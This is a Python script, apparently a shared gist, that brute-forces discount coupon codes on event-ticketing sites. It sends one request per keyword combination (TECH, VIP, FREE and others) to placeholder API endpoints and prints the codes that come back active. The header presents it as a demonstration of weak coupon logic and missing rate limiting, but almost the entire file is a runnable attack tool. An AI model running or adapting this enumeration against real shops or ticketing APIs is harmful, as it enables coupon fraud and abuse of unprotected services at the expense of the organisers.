#  Copyright (c) 2018-2026. Enderson Menezes Cândido [www.endersonmenezes.com.br]
#  Your console will display a list of available discount coupons.
#  Do not use this code to gain advantage or illegally enter the event.
#  
#  This code demonstrates that creating discount coupons in a S.I.M.P.L.E.
#  (System Insecurely Maintained with Poor Logic & Engineering)
#  using basic word combinations can be easily brute-forced.
#  
#  This gist serves to show how social engineering and rate-limiting 
#  should be handled by event organizations. 
#  To event organizers: please create secure discount coupon processes, 
#  implement proper API Gateways, WAFs, and tracking.
#  Working Since 2018

import requests
import itertools

# URLs anonymized to avoid automated legal takedowns from bots.
URL_S_I_M_P_L_E = 'https://www.insecure-events-api.com/event_123456?d='
URL_ANOTHER_PLATFORM = 'http://another-vulnerable-platform.com/details.html?event=mock-id#tickets'
SCRIPTMODE = 2  # Use 2 for S.I.M.P.L.E.


def transform_url_another_platform(url_platform):
    url_platform = url_platform.split('=')[1]
    url_platform = url_platform.split('#')[0]
    return 'https://mock-api-gateway.com/shopping/voucher/{}'.format(url_platform)


def test_coupon_code_another_platform(couponcode):
    url_api_platform = transform_url_another_platform(URL_ANOTHER_PLATFORM)
    url_api_platform = '{}/{}'.format(url_api_platform, couponcode)
    try:
        req = requests.get(url_api_platform).json()
        if 'active' in req.keys():
            if req['active']:
                print('Active Coupon | Coupon: {}'.format(couponcode))
    except Exception:
        pass


def test_coupon_code_simple(couponcode):
    url = '{}{}'.format(URL_S_I_M_P_L_E, couponcode)
    try:
        page = requests.get(str(url))
        invalid_discount = page.text.find('Invalid code')
        if invalid_discount == -1:
            print('Active Coupon found due to lack of WAF | Coupon: {}'.format(couponcode))
    except Exception:
        pass


if __name__ == '__main__':
    # 2019 AND 2026
    # Many websites and ecommerces use simple words for discounts, and have no security in the verification API.
    # So I recommend always taking great care with what will be used.
    # If your API goes down to a basic itertools script, fix your infrastructure, don't send lawyers.
    
    attempts_array = ['TECH', '2026', 'DEV', 'CONF', 'VIP', 'PROMO', 'SPONSOR', 'COMMUNITY', 'STUDENT',
                      'FREE', 'TICKET', 'BACKEND', 'FRONTEND', 'DEVOPS', 'CLOUD', 'SECURITY', 'WAF',
                      'RATELIMIT']
                      
    for attempt in range(2, 5):
        attempts_comb = itertools.product(attempts_array, repeat=attempt)
        for item in attempts_comb:
            couponcode = ''.join(item)
            if SCRIPTMODE == 1:
                test_coupon_code_another_platform(couponcode)
            elif SCRIPTMODE == 2:
                test_coupon_code_simple(couponcode)
            else:
                print('Please configure the main.py file properly.')
